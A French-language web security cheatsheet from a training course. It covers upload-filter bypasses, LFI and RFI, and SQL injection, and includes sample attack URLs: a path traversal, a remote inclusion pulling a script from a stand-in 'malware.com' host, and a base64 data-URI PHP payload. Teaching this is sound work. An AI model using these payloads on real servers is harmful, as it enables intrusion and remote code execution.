#<center>PoC Pool: Computer Security</center>
#<center>Web Server: Cheatsheet</center>

Vous avez compris que la sécurité d'une application web se joue coté serveur
mais vous avez également compris qu'une petite erreur de programmation
peut avoir de lourdes conséquences.

## HyperText Transfer Protocol

L'HTTP est un protocol complexe. Votre navigateur l'utilise en permanence
pour récupérer les ressources web qu'il vous affiche ensuite. Seulement,
votre navigateur ne vous montre que très peu de choses et il convient
de souvent utiliser la console du navigateur ou bien cURL losqu'on
fait de la sécurité.

[dirb](https://tools.kali.org/web-applications/dirb) est un bon outil pour
analyser l'arborescence d'une application de manière automatisée. Vous pouvez
alors espérer tomber sur des chemins intéressants tels qu'un dossier de test
ou de backup oublié qui vous donnera accès à des sources PHP.

## PHP: Hypertext Preprocessor

PHP est un langage très utilisé pour écrire des applications web.

Il est très facile d'écrire du code vulnérable en PHP. Une entrée utilisateur
ne doit JAMAIS etre prise pour valide ou bien formée.

## Upload

En vrac, quelques tricks pour exploiter une faille upload :

  * Le nullbyte `file.php%00.jpg`
  * Un changement de [type MIME](https://fr.wikipedia.org/wiki/Type_MIME) en
  interceptant la requete avec Burp ou autre
  * Une double extension (assez rare, repose sur une mauvaise configuration du
  serveur WEB)

## Local File Inclusion

Exemple d'URL vulnérable :

```
http://vulnerable.com/gallery.php?image=../index.php
```

Ce genre de faille est souvent due à une mauvaise utilisation de la fonction
`include()`.

## Remote File Inclusion

Meme principe, sur une URL externe plutot que interne. Du genre :

```
http://vulnerable.com/gallery.php?ducment=http://malware.com/expoit.php
```

On peut alors forcer l'exécution de notre propre script PHP.

On note l'utilisation d'un DataURI qui évite d'avoir à déployer un serveur
et tout :

```
http://vulnerable.com/gallery.php?document=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
```

On a ici un `<?php phpinfo() ?>` en base64. Cette base nous permet d'éviter
tout problème de caractère filtré, non-imprimable, pas URL-friendly...

## SQL

L'objectif est de forcer le serveur a exécuter des bouts de requete SQL que
nous allons injecter au milieu d'une requete valide. On peut alors faire
fuiter des informations ou simplement forcer un resultat particulier pour
par exemple obtenir une session sur un site.

Sans résultat direct sur la page (en effet, il est rare qu'un site vous affiche
à nouveau votre mot de passe après connexion...), il faut faire une
injection à l'aveugle. Regardez un peu [ce pdf](http://gits.hydraze.org/pdf/Blind-sql-injections.pdf).

Regardez donc cette [merveilleuse collection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20injection)
de ressources.
